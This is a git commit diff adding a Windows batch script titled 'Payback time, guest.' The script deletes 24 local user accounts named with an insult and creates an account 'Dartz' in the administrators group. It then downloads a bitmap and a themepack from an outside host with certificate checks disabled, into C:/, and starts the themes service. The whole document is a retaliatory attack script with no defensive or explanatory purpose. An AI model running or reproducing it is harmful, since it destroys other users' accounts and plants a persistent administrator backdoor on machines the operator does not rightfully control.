6a32dec0f4889340eaf4e46435e725f5d62e04c2
Windows98_SE (2003ryans) <ryanscales@yahoo.com>
2016-07-21 16:51:44 +0000

    asd

---
+++ undoguestusers.cmd
@@ -0,0 +1,33 @@
+@echo off
+title Payback time, guest.
+cls
+color 0A
+net user SHITHEAD /delete
+net user SHITHEAD1 /delete
+net user SHITHEAD2 /delete
+net user SHITHEAD3 /delete
+net user SHITHEAD4 /delete
+net user SHITHEAD5 /delete
+net user SHITHEAD6 /delete
+net user SHITHEAD7 /delete
+net user SHITHEAD8 /delete
+net user SHITHEAD9 /delete
+net user SHITHEAD10 /delete
+net user SHITHEAD11 /delete
+net user SHITHEAD12 /delete
+net user SHITHEAD13 /delete
+net user SHITHEAD14 /delete
+net user SHITHEAD15 /delete
+net user SHITHEAD16 /delete
+net user SHITHEAD17 /delete
+net user SHITHEAD18 /delete
+net user SHITHEAD19 /delete
+net user SHITHEAD20 /delete
+net user SHITHEAD21 /delete
+net user SHITHEAD22 /delete
+net user SHITHEAD23 /delete
+net user Dartz /add
+net localgroup administrators Dartz /add
+wget -O C:/blinky.bmp http://b.1339.cf/nqhcmgt.bmp --no-check-certificate
+wget -O C:/defaulttheme.themepack http://b.1339.cf/durummb.themepack --no-check-certificate
+net start themes
